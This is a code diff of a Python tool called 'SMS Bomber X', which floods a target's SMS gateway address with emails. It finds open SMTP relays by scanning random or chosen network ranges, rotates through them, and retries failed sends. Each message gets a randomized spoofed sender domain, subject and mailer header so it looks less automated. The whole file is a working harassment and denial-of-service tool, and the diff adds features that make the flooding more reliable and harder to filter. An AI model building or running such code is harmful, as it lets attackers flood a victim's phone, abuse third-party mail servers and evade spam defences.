-        # Using a while loop makes handling retries easier than modifying 'i' in a for loop
-        current_message_index = 0
-        total_failures = 0
-        while sent_count < config.message_count:
-        
-            # Check if we've exhausted relays or hit total failure limit
-            if not relay_manager.active_relays:
-                log.error("Relay pool is now empty. Aborting bombing run.")
-                break
-            if total_failures >= max_total_failures_before_abort:
-                 log.critical(f"Exceeded maximum total failure threshold ({max_total_failures_before_abort}). Aborting bombing run.")
-                 break
+        # Loop until the target number of messages are successfully sent
+        # Using 'while' allows easier handling of retries for the same message index
+        message_index_to_send = 0 # Use this to track which message number we are trying to send
+        while message_index_to_send < config.message_count:
+            
+            current_attempt_number = message_index_to_send + 1 # For user display (1-based index)
 
-            # Get the next relay from the pool (round-robin)
+            # --- Pre-attempt Checks ---
+            if not relay_manager.active_relays:
+                log.error("Relay pool became empty during bombing run. Aborting.")
+                progress.update(task_bomb_id, description="[bold red]ABORTED (No Relays Left)")
+                break # Exit the main while loop
+            
+            if total_consecutive_failures >= max_total_consecutive_failures_before_abort:
+                 log.critical(f"Exceeded maximum total consecutive failure threshold ({max_total_consecutive_failures_before_abort}). Aborting bombing run.")
+                 progress.update(task_bomb_id, description="[bold red]ABORTED (Too Many Failures)")
+                 break # Exit the main while loop
+
+            if failure_count_this_message >= max_failures_per_message_before_skip:
+                 log.error(f"Failed to send message {current_attempt_number} after {failure_count_this_message} attempts. Skipping this message.")
+                 # Skip this message index and move to the next
+                 failure_count_this_message = 0 # Reset counter for the next message index
+                 # Do NOT advance the main progress bar here for a skip
+                 progress.update(task_bomb_id, description=f"[red]Skipped message {current_attempt_number}. Moving to {current_attempt_number + 1}...") 
+                 message_index_to_send += 1 # Move to the next message index
+                 time.sleep(0.5) # Small pause before trying next message index
+                 continue # Continue to the next iteration of the while loop (next message index)
+
+            # --- Get Relay for this attempt ---
             current_relay = relay_manager.get_next_active_relay()
             
-            # If get_next_active_relay returns None, all relays might have failed recently
             if not current_relay or not current_relay.connection:
-                log.warning("Could not retrieve a working relay connection from the pool. Waiting briefly...")
-                time.sleep(1.0) # Wait a moment before trying the loop again
-                total_failures += 1 # Increment total failure count
-                failure_this_message += 1
-                continue # Try the loop again (maybe a relay comes back or check aborts)
+                log.warning(f"Could not retrieve a working relay connection (Attempt {failure_count_this_message + 1} for Msg {current_attempt_number}). Waiting briefly...")
+                time.sleep(0.5 + random.uniform(0, 0.5)) # Add small random jitter
+                failure_count_this_message += 1 # Increment failure count for this message index
+                total_consecutive_failures += 1 # Increment overall consecutive failures
+                # Loop continues, will try again (possibly with same relay if only one left, or next)
+                continue 
 
+            # --- Got a relay, proceed ---
             host_port = f"{current_relay.host}:{current_relay.port}"
-            log.debug(f"Attempting message {sent_count + 1}/{config.message_count} via relay {host_port}")
-            
-            # Update progress bar description
-            progress.update(task_bomb_id, description=f"[magenta]Sending ({sent_count+1}/{config.message_count}) via {host_port}")
+            log.debug(f"Attempting Msg {current_attempt_number}/{config.message_count} via relay {host_port}")
+            progress.update(task_bomb_id, description=f"[magenta]Sending ({current_attempt_number}/{config.message_count}) via {host_port}")
 
-            # --- Prepare the email message ---
+            # --- Prepare Message ---
+            # Generate fresh details for each send attempt
             try:
-                 # Generate unique details for each message attempt
-                 from_local = random_string(random.randint(6, 12))
-                 from_domain_chars = string.ascii_lowercase + string.digits
-                 from_domain = f"{''.join(random.choice(from_domain_chars) for _ in range(random.randint(4, 8)))}.{random.choice(['com', 'net', 'org', 'info', 'biz'])}"
-                 from_email = f"{from_local}@{from_domain}"
+                from_local = random_string(random.randint(7, 11))
+                # Generate more plausible domain names
+                domain_part1 = random_string(random.randint(4, 7))
+                domain_part2 = random.choice(['mail', 'email', 'svc', 'comms', 'sys'])
+                domain_tld = random.choice(['com', 'net', 'org', 'info', 'online', 'xyz'])
+                from_domain = f"{domain_part1}-{domain_part2}.{domain_tld}"
+                from_email = f"{from_local}@{from_domain}"
                  
-                 message_body = random.choice(messages) # Select a random message
+                message_body = random.choice(messages) # Select a random message
                  
-                 msg = MIMEMultipart('alternative')
-                 msg['From'] = from_email
-                 msg['To'] = config.target_email
-                 # Use slightly varied subjects
-                 subject_prefix = random.choice(["Notification", "Alert", "Update", "Info", "Status", "Ref"])
-                 msg['Subject'] = f"{subject_prefix}: {random_string(random.randint(8, 15))}" 
-                 msg['Date'] = smtplib.email.utils.formatdate(localtime=True)
-                 msg['Message-ID'] = smtplib.make_msgid(domain=from_domain) 
-                 msg['X-Priority'] = str(random.randint(3, 5)) # Low to normal priority
-                 # Optionally add other headers to look less automated
-                 msg['User-Agent'] = f"Agent/{random.uniform(1.0, 5.0):.1f}" 
+                msg = MIMEMultipart('alternative')
+                msg['From'] = f"{random_string(5)} <{from_email}>" # Optional "Real Name" part
+                msg['To'] = config.target_email
+                # Slightly more varied subjects
+                subject_prefix = random.choice(["Re:", "Fwd:", "Status:", "Notification:", "", "Update:"])
+                subject_body = random_string(random.randint(6, 12)).capitalize()
+                msg['Subject'] = f"{subject_prefix} {subject_body} [{random.randint(100,999)}]" if subject_prefix else f"{subject_body} Report #{random.randint(1000,9999)}"
                  
-                 msg.attach(MIMEText(message_body, 'plain', 'utf-8')) # Ensure UTF-8 encoding
-                 
-                 message_string = msg.as_string()
-                 
+                msg['Date'] = smtplib.email.utils.formatdate(localtime=True)
+                msg['Message-ID'] = smtplib.make_msgid(domain=from_domain.split('.')[-2]+'.'+from_domain.split('.')[-1]) # Use base domain for msgid
+                msg['X-Priority'] = str(random.choice([1, 3, 3, 3, 5])) # Skew towards normal priority
+                msg['X-Mailer'] = random.choice([f"PHPMailer {random.uniform(5.0, 6.5):.1f}", f"SysMailer v{random.randint(1,3)}.{random.randint(0,9)}", ""]) # Common mailers or none
+
+                # Ensure plain text part has UTF-8 encoding
+                msg.attach(MIMEText(message_body, 'plain', 'utf-8')) 
+                
+                message_string = msg.as_string() # Final message to be sent
+
             except Exception as prep_err:
-                  log.error(f"Failed to prepare message {sent_count + 1}: {prep_err}. Skipping message.", exc_info=True)
-                  total_failures += 1
-                  failure_this_message += 1 
-                  continue # Skip to next attempt
+                log.error(f"Failed to prepare message {current_attempt_number}: {prep_err}. Retrying message preparation.", exc_info=True)
+                failure_count_this_message += 1 
+                total_consecutive_failures += 1
+                time.sleep(0.5) # Pause before retrying preparation/send
+                continue # Skip send attempt for this iteration, retry message from preparation step
 
-            # --- Attempt to send the email ---
+            # --- Attempt Send using selected Relay ---
             try:
-                log.debug(f"Executing sendmail for message {sent_count + 1} via {host_port}")
-                # Send the email using the current relay's connection object
+                log.debug(f"Executing sendmail from '{from_email}' to '{config.target_email}' via {host_port}")
                 current_relay.connection.sendmail(from_email, [config.target_email], message_string) 
                 
                 # --- Success ---
-                log.info(f"Message {sent_count + 1}/{config.message_count} sent successfully via {host_port}")
-                sent_count += 1
-                failure_this_message = 0 # Reset failure count for this message index
-                total_failures = 0 # Reset total consecutive failures on any success
-                progress.update(task_bomb_id, advance=1, description=f"[magenta]Sent ({sent_count}/{config.message_count})") # Update progress after success
-                
-                # --- Apply Dynamic Delay ---
-                if sent_count < config.message_count: # No delay after the last message
+                log.info(f"[bold green]SUCCESS[/]: Message {current_attempt_number}/{config.message_count} sent via {host_port}")
+                sent_count = current_attempt_number # Update actual count of successfully sent messages
+                failure_count_this_message = 0 # Reset failure counter for *this* message index
+                total_consecutive_failures = 0 # Reset overall consecutive failure counter
+                progress.update(task_bomb_id, advance=1, description=f"[magenta]Sent ({sent_count}/{config.message_count})") # Advance main progress bar
+
+                # --- Move to Next Message Index ---
+                message_index_to_send += 1 # Successfully sent, move to the next required message
+
+                # --- Apply Dynamic Delay (if not the last message) ---
+                if message_index_to_send < config.message_count: 
                     delay = random.uniform(config.delay_min, config.delay_max)
-                    log.debug(f"Waiting for {delay:.2f} seconds...")
+                    log.debug(f"Waiting for {delay:.2f} seconds before next message...")
+                    # Update progress to show waiting status
                     progress.update(task_bomb_id, description=f"[magenta]Waiting {delay:.1f}s... ({sent_count}/{config.message_count} Sent)")
-                    # Use time.sleep for the delay
+                    # Use time.sleep - cannot make progress bar sleep directly responsive easily
                     time.sleep(delay) 
 
-            # --- Handle Specific SMTP Errors during Send ---
+            # --- Handle SMTP Send Errors ---
             except (smtplib.SMTPServerDisconnected, smtplib.SMTPResponseException, smtplib.SMTPConnectError, socket.error) as relay_err:
-                log.warning(f"Relay {host_port} connection failed during send: {relay_err}. Marking relay as failed.")
+                log.warning(f"Relay {host_port} FAILED during send for msg {current_attempt_number}: {relay_err}. Marking relay failed.")
                 relay_manager.mark_relay_failed(current_relay, reason=f"send_fail_{type(relay_err).__name__}")
-                failure_this_message += 1
-                total_failures += 1
-                # Do *not* advance sent_count, retry message with the next relay in the next loop iteration
-                progress.update(task_bomb_id, description=f"[yellow]Relay {host_port} failed. Retrying message {sent_count + 1}...") 
-                # Loop continues to try next relay
-                
+                failure_count_this_message += 1
+                total_consecutive_failures += 1
+                # Do *not* advance message_index_to_send; retry this message number with next relay
+                progress.update(task_bomb_id, description=f"[yellow]Relay {host_port} failed. Retrying message {current_attempt_number}...") 
+                # Loop continues to try next relay for the same message index
+
             except smtplib.SMTPRecipientsRefused as e:
-                 # This usually means the target address is invalid or blocked by the *current* relay
-                 log.error(f"Recipient {config.target_email} REFUSED by relay {host_port}. Error: {e}. Aborting run.")
-                 # Mark this relay as potentially problematic for this recipient, but the issue might be the target itself
-                 relay_manager.mark_relay_failed(current_relay, reason="recipient_refused") 
-                 failure_this_message += 1
-                 total_failures += 1
-                 progress.update(task_bomb_id, description=f"[bold red]Recipient Refused by {host_port}. ABORTING.")
-                 break # Stop the entire bombing run - target address likely unusable
+                 # Recipient refused by THIS relay. Might be target or relay issue.
+                 log.error(f"Recipient '{config.target_email}' REFUSED by relay {host_port} for msg {current_attempt_number}. Error: {e}.")
+                 # Let's mark this relay but allow trying OTHERS before aborting the whole run.
+                 relay_manager.mark_relay_failed(current_relay, reason="recipient_refused_attempt") 
+                 failure_count_this_message += 1
+                 total_consecutive_failures += 1
+                 progress.update(task_bomb_id, description=f"[yellow]Recipient Refused by {host_port}. Retrying msg {current_attempt_number} on other relays...")
+                 # If *all* relays refuse the recipient, the skip mechanism should eventually trigger.
 
             except smtplib.SMTPSenderRefused as e:
-                 log.warning(f"Sender '{from_email}' refused by {host_port}. Error: {e}. Marking relay failed & retrying message.")
+                 log.warning(f"Sender '{from_email}' refused by {host_port} for msg {current_attempt_number}. Error: {e}. Marking relay failed & retrying.")
                  relay_manager.mark_relay_failed(current_relay, reason="sender_refused")
-                 failure_this_message += 1
-                 total_failures += 1
-                 progress.update(task_bomb_id, description=f"[yellow]Sender Refused by {host_port}. Retrying message {sent_count + 1}...")
-                 # Loop continues to try next relay
+                 failure_count_this_message += 1
+                 total_consecutive_failures += 1
+                 progress.update(task_bomb_id, description=f"[yellow]Sender Refused by {host_port}. Retrying message {current_attempt_number}...")
+                 # Loop continues
 
             except smtplib.SMTPDataError as e:
-                 log.warning(f"SMTP 'DATA' command error sending via {host_port}. Error: {e}. Marking relay failed & retrying message.")
+                 log.warning(f"SMTP 'DATA' command error sending via {host_port} for msg {current_attempt_number}. Error: {e}. Marking relay failed & retrying.")
                  relay_manager.mark_relay_failed(current_relay, reason="data_error")
-                 failure_this_message += 1
-                 total_failures += 1
-                 progress.update(task_bomb_id, description=f"[yellow]DATA Error via {host_port}. Retrying message {sent_count + 1}...")
-                 # Loop continues to try next relay
+                 failure_count_this_message += 1
+                 total_consecutive_failures += 1
+                 progress.update(task_bomb_id, description=f"[yellow]DATA Error via {host_port}. Retrying message {current_attempt_number}...")
+                 # Loop continues
                  
             except Exception as e:
-                 log.critical(f"Unexpected error during send attempt via {host_port}: {e}", exc_info=True)
-                 # Potentially mark the relay as failed due to an unknown issue
+                 log.critical(f"Unexpected error during send attempt via {host_port} for msg {current_attempt_number}: {e}", exc_info=True)
+                 # Mark relay failed for unexpected issues during send
                  relay_manager.mark_relay_failed(current_relay, reason="unexpected_send_error")
-                 failure_this_message += 1
-                 total_failures += 1
-                 progress.update(task_bomb_id, description=f"[red]Unexpected Error via {host_port}. Retrying msg {sent_count + 1}...")
-                 # Decide if fatal enough to stop the run? For now, let it retry.
-                 # if IsFatal(e): break
-            
-            # Safety break: If we fail too many times for the *same message* index across different relays
-            if failure_this_message >= (len(relay_manager.active_relays) + 2): # Allow trying all relays plus a couple retries
-                 log.error(f"Failed to send message {sent_count + 1} after {failure_this_message} attempts across available relays. Skipping message.")
-                 # Skip this message index and move to the next
-                 failure_this_message = 0 # Reset counter for the next message
-                 # Manually advance progress to indicate skipping, but don't count as sent
-                 progress.update(task_bomb_id, advance=0, description=f"[red]Skipped message {sent_count+1}. Moving on...") 
-                 sent_count += 1 # Increment sent_count to move the while loop condition forward eventually
-                 time.sleep(1.0) # Small pause before trying next message index
+                 failure_count_this_message += 1
+                 total_consecutive_failures += 1
+                 progress.update(task_bomb_id, description=f"[red]Unexpected Error via {host_port}. Retrying msg {current_attempt_number}...")
+                 # Allow retry mechanism to handle it, might eventually skip/abort
 
 
     except KeyboardInterrupt:
         log.warning("Bombing run interrupted by user (KeyboardInterrupt).")
-        progress.stop() # Stop progress display
+        # Stop progress cleanly if possible
+        try: progress.stop()
+        except Exception: pass
         raise # Re-raise interrupt for main loop handling
 
     except Exception as e:
-        # Catch unexpected errors in the bombing loop itself
-        log.critical(f"Critical error during bombing execution: {e}", exc_info=True)
-        progress.stop() # Ensure progress stops
+        # Catch unexpected errors in the bombing loop's control flow
+        log.critical(f"Critical error during bombing execution control: {e}", exc_info=True)
+        try: progress.stop()
+        except Exception: pass
 
     finally:
-        log.debug("Bombing execution block finished.")
-        # Ensure progress task is updated correctly on finish/interrupt/error
-        # Check if the task object still exists (it might be removed if progress stopped abruptly)
-        final_sent = sent_count # Use the actual count achieved
+        log.debug("Bombing execution block finishing.")
+        # Update progress bar to final state based on actual sent count
+        final_sent = sent_count # Actual number successfully sent
         try:
-            if not progress.tasks[task_bomb_id].finished:
-                final_desc = f"[magenta]Bombing Finished ({final_sent}/{config.message_count} Sent)"
-                progress.update(task_bomb_id, completed=config.message_count, description=final_desc) # Mark as fully complete visually
-        except IndexError:
-              log.debug("Bombing progress task already removed.") # Task likely removed on stop/error
+            # Check task still exists
+            task_exists = any(task.id == task_bomb_id for task in progress.tasks)
+            if task_exists and not progress.tasks[task_bomb_id].finished:
+                 final_desc = f"[magenta]Bombing Finished ({final_sent}/{config.message_count} Sent)"
+                 # Mark progress visually complete relative to the *target* count
+                 progress.update(task_bomb_id, completed=config.message_count, description=final_desc) 
+        except (IndexError, Exception) as fin_err:
+             log.warning(f"Could not finalize bombing progress task: {fin_err}") 
               
-        log.info(f"Bombing run complete. Successfully sent: {final_sent}/{config.message_count}.")
+        log.info(f"Bombing run ended. Total successfully sent: {final_sent}/{config.message_count}.")
 
 
 # --- Profile Management ---
 def list_profiles() -> List[str]:
-    """Returns a list of available profile names (without .json extension)."""
+    """Returns a sorted list of available profile names found in the profiles directory."""
     try:
         if PROFILES_DIR.is_dir():
-            return sorted([f.stem for f in PROFILES_DIR.glob("*.json") if f.is_file()])
+            # Use glob to find files, check they are files, then get stem (name without ext)
+            profile_files = [f.stem for f in PROFILES_DIR.glob("*.json") if f.is_file()]
+            return sorted(profile_files) # Sort alphabetically
         else:
-             return []
+            log.debug(f"Profiles directory does not exist: {PROFILES_DIR}")
+            return []
     except OSError as e:
          log.error(f"Error accessing profiles directory {PROFILES_DIR}: {e}")
          return []
 
 def load_profile(profile_name: str) -> Optional[AppConfig]:
-    """Loads an AppConfig from a specified profile file."""
-    if not profile_name: return None
+    """Loads an AppConfig object from a specified profile JSON file."""
+    if not profile_name: 
+        log.warning("Attempted to load profile with empty name.")
+        return None
+        
     profile_path = PROFILES_DIR / f"{profile_name}.json"
     if profile_path.is_file():
         try:
@@ -1050,35 +1168,40 @@ def load_profile(profile_name: str) -> Optional[AppConfig]:
             with open(profile_path, 'r', encoding='utf-8') as f:
                 config_dict = json.load(f)
             
-            # Create default config and update with loaded values
+            # Create a default AppConfig instance to populate
             config = AppConfig() 
-            loaded_keys = 0
+            loaded_keys_count = 0
+            known_keys = AppConfig.__annotations__.keys() # Get expected keys from dataclass
+
             for key, value in config_dict.items():
-                if hasattr(config, key):
-                    # Basic type validation/conversion could be added here if needed
+                if key in known_keys:
+                    # Perform basic type validation or conversion if necessary
                     try:
                         expected_type = AppConfig.__annotations__.get(key)
-                        # Attempt conversion if types differ (e.g., float might be saved as int)
-                        # This is basic, more complex types would need more handling
-                        if expected_type == float and isinstance(value, int):
-                           value = float(value)
-                        elif expected_type == int and isinstance(value, float):
-                             value = int(value) # Be cautious with float->int conversion
-                             
+                        # Handle potential type mismatches from JSON (e.g., int saved as float)
+                        # This needs careful consideration for complex types (like List[int])
+                        current_value = getattr(config, key)
+                        value_type = type(current_value) if current_value is not None else expected_type # Target type
+                        
+                        if value_type == float and isinstance(value, (int, float)): value = float(value)
+                        elif value_type == int and isinstance(value, (int, float)): value = int(value) # Truncation risk
+                        elif value_type == bool and isinstance(value, (int, bool)): value = bool(value)
+                        # Add more checks for List etc. if required, or rely on exceptions
+                        
                         setattr(config, key, value)
-                        loaded_keys += 1
-                    except TypeError as e:
-                         log.warning(f"Type mismatch for key '{key}' in profile '{profile_name}'. Using default. Error: {e}")
+                        loaded_keys_count += 1
+                    except (TypeError, ValueError) as type_err:
+                         log.warning(f"Type mismatch or conversion error for key '{key}' in profile '{profile_name}'. Using default value. Error: {type_err}")
                 else:
                     log.warning(f"Ignoring unknown key '{key}' found in profile '{profile_name}'.")
             
-            # Ensure profile name itself is set correctly in the loaded config
+            # Ensure the profile name in the loaded config matches the filename stem
             config.profile_name = profile_name 
-            log.info(f"Successfully loaded {loaded_keys} settings from profile '{profile_name}'.")
+            log.info(f"Successfully loaded {loaded_keys_count} settings from profile '{profile_name}'.")
             return config
             
         except (json.JSONDecodeError, IOError, TypeError) as e:
-            log.error(f"Failed to load or parse profile '{profile_name}': {e}")
+            log.error(f"Failed to load or parse profile file '{profile_path}': {e}")
             return None
         except Exception as e:
              log.error(f"Unexpected error loading profile '{profile_name}': {e}", exc_info=True)
@@ -1087,161 +1210,191 @@ def load_profile(profile_name: str) -> Optional[AppConfig]:
         log.warning(f"Profile file not found: '{profile_path}'")
         return None
 
-def save_profile(config: AppConfig):
-    """Saves the current AppConfig to a profile file."""
+def save_profile(config: AppConfig) -> bool:
+    """Saves the current AppConfig object to a profile JSON file. Returns True on success."""
     
     # Validate profile name before attempting to save
-    profile_name_regex = r"^[a-zA-Z0-9_\-. ]+$" # Allow spaces, dots, hyphen, underscore
-    profile_name_to_save = config.profile_name.strip()
+    # Allow letters, numbers, space, underscore, hyphen, dot
+    profile_name_regex = r"^[a-zA-Z0-9_\-. ]+$" 
+    profile_name_to_save = config.profile_name.strip() # Remove leading/trailing whitespace
     
-    if not profile_name_to_save or not re.match(profile_name_regex, profile_name_to_save):
-        log.error(f"Invalid profile name '{config.profile_name}'. Please use letters, numbers, spaces, dots, underscores, or hyphens.")
-        # Ask for a valid name interactively
-        new_name = Prompt.ask("[yellow]Enter a valid profile name:", default="default_profile")
-        new_name = new_name.strip()
-        if not new_name or not re.match(profile_name_regex, new_name):
-             log.error("Still invalid profile name. Aborting save.")
+    # Check for invalid or empty name
+    if not profile_name_to_save or not re.match(profile_name_regex, profile_name_to_save) or profile_name_to_save.lower() == '[none]':
+        log.error(f"Invalid profile name provided: '{config.profile_name}'. Cannot save.")
+        console.print(f"[red]Error:[/red] Profile name '{config.profile_name}' is invalid.")
+        # Ask interactively for a valid name
+        new_name = Prompt.ask(
+            "[yellow]Enter a valid name for the profile (letters, numbers, spaces, -, _, .):[/yellow]", 
+            default="new_profile" # Provide a default
+            ).strip()
+            
+        # Re-validate the entered name
+        if not new_name or not re.match(profile_name_regex, new_name) or new_name.lower() == '[none]':
+             log.error(f"Still invalid profile name: '{new_name}'. Aborting profile save.")
+             console.print("[red]Save cancelled due to invalid name.[/red]")
              return False # Indicate save failure
-        config.profile_name = new_name # Update the config object with the valid name
-        profile_name_to_save = new_name # Use the validated name
+             
+        # Update the config object AND the name to use for saving
+        config.profile_name = new_name 
+        profile_name_to_save = new_name 
         
+    # Proceed with saving using the validated name
     profile_path = PROFILES_DIR / f"{profile_name_to_save}.json"
-    log.debug(f"Saving profile to: {profile_path}")
+    log.debug(f"Saving profile configuration to: {profile_path}")
     
     try:
         # Convert the dataclass object to a dictionary for JSON serialization
-        # Use vars() or dataclasses.asdict()
-        config_dict = config.__dict__ 
+        # Using vars() is simple for basic dataclasses
+        config_dict = vars(config) 
         
-        # Ensure the profiles directory exists
+        # Ensure the profiles directory exists (redundant check, but safe)
         profile_path.parent.mkdir(parents=True, exist_ok=True)
         
-        # Write the dictionary to the JSON file
+        # Write the dictionary to the JSON file with UTF-8 encoding and indentation
         with open(profile_path, 'w', encoding='utf-8') as f:
-            json.dump(config_dict, f, indent=2, ensure_ascii=False) # Use indent for readability
+            json.dump(config_dict, f, indent=2, ensure_ascii=False) # Indent for readability
             
-        log.info(f"Configuration saved successfully as profile '{profile_name_to_save}'.")
+        log.info(f"Configuration successfully saved as profile '{profile_name_to_save}'.")
+        console.print(f"[green]Profile '{profile_name_to_save}' saved.[/green]")
         return True # Indicate success
         
     except (IOError, TypeError, OSError) as e:
         log.error(f"Failed to save profile '{profile_name_to_save}': {e}")
+        console.print(f"[red]Error saving profile: {e}[/red]")
         return False # Indicate failure
     except Exception as e:
          log.error(f"Unexpected error saving profile '{profile_name_to_save}': {e}", exc_info=True)
+         console.print(f"[red]Unexpected error saving profile. Check logs.[/red]")
          return False # Indicate failure
 
 def get_user_config_interactive() -> Optional[AppConfig]:
-    """Interactively gathers configuration settings from the user."""
+    """Interactively gathers configuration settings from the user, allows loading/saving profiles."""
     
     # Start with a default configuration object
     config = AppConfig() 
     
-    console.print(Panel("SMS Bomber X Configuration", title="[bold cyan]Setup", style="cyan", border_style="cyan"))
+    console.print(Panel("SMS Bomber X Configuration", title="[bold cyan]Setup[/]", style="cyan", border_style="cyan", padding=(1,2)))
     
     # --- Offer to Load Existing Profile ---
     available_profiles = list_profiles()
     if available_profiles:
-        profile_choices = ["[none]"] + available_profiles
+        # Add '[none]' as the first choice to allow creating new config
+        profile_choices = ["[none]"] + available_profiles 
         load_choice = Prompt.ask(
-            f"Load an existing profile or create new configuration?", 
+            "Load existing profile or create new?", 
             choices=profile_choices, 
-            default="[none]"
+            default="[none]" # Default is to not load a profile
         )
         if load_choice != "[none]":
             loaded_config = load_profile(load_choice)
             if loaded_config:
-                # Confirm if user wants to use the loaded config or modify it
-                if Confirm.ask(f"Use loaded profile '{load_choice}' settings?", default=True):
-                     return loaded_config # Return the successfully loaded config
-                else:
-                     config = loaded_config # Start modification from loaded config
-                     console.print("[yellow]Modifying loaded profile settings.[/]")
+                # Ask user if they want to use the loaded settings directly
+                use_loaded = Confirm.ask(f"Use settings from profile [green]'{load_choice}'[/]?", default=True)
+                if use_loaded:
+                    console.print(f"[green]Using configuration from profile '{load_choice}'.[/green]")
+                    return loaded_config # Return the loaded config and skip interactive setup
+
+                # User wants to modify the loaded profile settings
+                config = loaded_config # Start modification from the loaded settings
+                console.print(f"[yellow]Modifying settings loaded from profile '{load_choice}'.[/yellow]")
             else:
-                 console.print(f"[red]Failed to load profile '{load_choice}'. Continuing with manual configuration.[/]")
-                 # Fall through to manual configuration starting with defaults
+                 # Loading failed, inform user and proceed with default manual config
+                 console.print(f"[red]Failed to load profile '{load_choice}'.[/red] Starting new configuration.")
+                 # Fall through to manual config using the default `config` object
     else:
-         console.print("[i blue]No existing profiles found. Starting new configuration.[/i]")
+         # Corrected Markup Error: Removed '[i]' tag, used explicit '[/blue]' close
+         console.print("[blue]No existing profiles found. Starting new configuration.[/blue]")
 
     # --- Gather Configuration Details Interactively ---
-    console.print(Panel("Target & Message Settings", style="magenta"))
+    # Use Panels to group related settings visually
+    console.print(Panel("Target & Message Settings", style="magenta", title_align="left", border_style="magenta"))
 
     # Target Email
     while True:
-         current_target = f" (current: [green]{config.target_email}[/])" if config.target_email else ""
-         target_input = Prompt.ask(f"Enter target SMS gateway address{current_target}", default=config.target_email)
-         if validate_email(target_input):
-             config.target_email = target_input
-             break
-         else:
-             console.print("[red]Invalid email address format. Please try again.[/]")
+        # Display current value from config (could be default or loaded profile)
+        current_target_display = f" (current: [cyan]{config.target_email}[/])" if config.target_email else ""
+        target_input = Prompt.ask(f"Enter target SMS gateway address{current_target_display}", default=config.target_email)
+        if validate_email(target_input):
+            config.target_email = target_input.strip() # Store stripped value
+            break # Exit loop on valid email
+        else:
+            console.print("[prompt.invalid]Invalid email address format. Please try again.")
 
     # Message Count
     config.message_count = IntPrompt.ask("Number of messages to send", default=config.message_count)
+    if config.message_count < 1: config.message_count = 1 # Ensure at least 1 message
     
-    # Dynamic Delay - use FloatPrompt
-    config.delay_min = FloatPrompt.ask("Minimum delay between messages (seconds, e.g., 1.5)", default=config.delay_min)
-    config.delay_max = FloatPrompt.ask("Maximum delay between messages (seconds, e.g., 5.0)", default=config.delay_max)
-    # Ensure min <= max
-    if config.delay_min < 0: config.delay_min = 0.0 # Ensure non-negative delay
+    # Dynamic Delay using FloatPrompt
+    console.print("\n[i]Delay between messages (randomized):[/i]")
+    config.delay_min = FloatPrompt.ask(" Minimum delay (seconds)", default=config.delay_min)
+    config.delay_max = FloatPrompt.ask(" Maximum delay (seconds)", default=config.delay_max)
+    # Validate and adjust delays
+    if config.delay_min < 0: config.delay_min = 0.0 # Non-negative
     if config.delay_max < config.delay_min:
-        console.print(f"[yellow]Warning: Maximum delay ({config.delay_max}s) is less than minimum ({config.delay_min}s). Setting max = min + 1.0s.[/]")
-        config.delay_max = config.delay_min + 1.0
+        console.print(f"[yellow]Warning:[/yellow] Maximum delay ({config.delay_max:.1f}s) was less than minimum ({config.delay_min:.1f}s). Adjusting max delay.")
+        config.delay_max = config.delay_min + max(1.0, config.delay_min * 0.5) # Ensure max is reasonably larger
+        console.print(f"  New maximum delay: [green]{config.delay_max:.1f}s[/green]")
 
-    # Custom Message File
-    current_msg_file = f" (current: [green]{config.message_file}[/])" if config.message_file else " (current: use defaults)"
-    use_custom = Confirm.ask(f"Use a custom message file?{current_msg_file}", default=bool(config.message_file))
-    if use_custom:
-         # Provide default based on current config if available
-         default_path = config.message_file if config.message_file else "messages.txt"
-         file_input = Prompt.ask("Enter path to message file", default=default_path)
-         message_path = Path(file_input)
-         # Check if the file exists *now* to provide immediate feedback
-         if not message_path.is_file():
-             console.print(f"[yellow]Warning:[/yellow] File '{message_path}' doesn't currently exist.")
-             # Optional: Ask if they want to proceed anyway or re-enter
-             # if not Confirm.ask("Continue anyway (file might be created later)?", default=True): continue # Re-prompt file path if needed
-         config.message_file = str(message_path) # Store as string
+    # Custom Message File Path
+    current_msg_file_display = f" (current: [cyan]{config.message_file}[/])" if config.message_file else " (current: [dim]use defaults[/dim])"
+    use_custom_file = Confirm.ask(f"Use custom message file?{current_msg_file_display}", default=bool(config.message_file))
+    if use_custom_file:
+        default_path = config.message_file if config.message_file else "messages.txt" # Suggest current or default filename
+        file_input = Prompt.ask(" Enter path to message file", default=default_path)
+        message_path = Path(file_input.strip()) # Strip whitespace from path
+        # Provide immediate feedback if the file doesn't seem to exist
+        if not message_path.exists(): # Check if path exists at all
+            console.print(f"[yellow]Warning:[/yellow] Path '{message_path}' doesn't exist.")
+        elif not message_path.is_file():
+            console.print(f"[yellow]Warning:[/yellow] Path '{message_path}' exists but is not a regular file (e.g., it's a directory).")
+        config.message_file = str(message_path) # Store path as string
     else:
-        config.message_file = None # Explicitly set to None if not using custom
+        config.message_file = None # Ensure it's None if not using custom file
 
     # --- Scanner Settings ---
-    console.print(Panel("Relay Scanner Settings", style="blue"))
+    console.print(Panel("Relay Scanner Settings", style="blue", title_align="left", border_style="blue"))
 
+    # SMTP Ports to Scan
     ports_input = Prompt.ask("Enter SMTP ports to scan (comma-separated)", default=",".join(map(str, config.scan_ports)))
     config.scan_ports = parse_ports(ports_input)
 
-    current_range = f" (current: [green]{config.scan_range_raw}[/])" if config.scan_range_raw else " (current: use random /16)"
-    config.scan_range_raw = Prompt.ask(f"Enter scan target (hostname, IP, CIDR, or blank for random){current_range}", default=config.scan_range_raw)
+    # Scan Target (Range/Host/IP or Blank for Random)
+    current_range_display = f" (current: [cyan]{config.scan_range_raw}[/])" if config.scan_range_raw else " (current: [dim]random /16[/dim])"
+    config.scan_range_raw = Prompt.ask(f"Enter scan target (hostname, IP, CIDR, or blank){current_range_display}", default=config.scan_range_raw).strip()
     
-    config.scan_timeout = IntPrompt.ask("Connection timeout per relay (seconds)", default=config.scan_timeout)
-    if config.scan_timeout < 1: config.scan_timeout = 1 # Min timeout 1 second
+    # Scan Parameters
+    config.scan_timeout = IntPrompt.ask(" Connection timeout per relay (seconds)", default=config.scan_timeout)
+    if config.scan_timeout < 1: config.scan_timeout = 1 # Minimum timeout
+    
+    config.scan_workers = IntPrompt.ask(" Max concurrent scan workers", default=config.scan_workers)
+    if config.scan_workers < 1: config.scan_workers = 1 # Minimum workers
 
-    config.scan_workers = IntPrompt.ask("Max concurrent scan workers", default=config.scan_workers)
-    if config.scan_workers < 1: config.scan_workers = 1 # Min 1 worker
-
-    config.relay_pool_target = IntPrompt.ask("Stop scan after finding this many working relays (0 = find all)", default=config.relay_pool_target)
-    if config.relay_pool_target < 0: config.relay_pool_target = 0 # Allow 0 for unlimited
+    config.relay_pool_target = IntPrompt.ask(" Stop scan after finding N working relays (0=scan all targets)", default=config.relay_pool_target)
+    if config.relay_pool_target < 0: config.relay_pool_target = 0 # 0 means scan everything specified
 
     # --- Cache and Log Settings ---
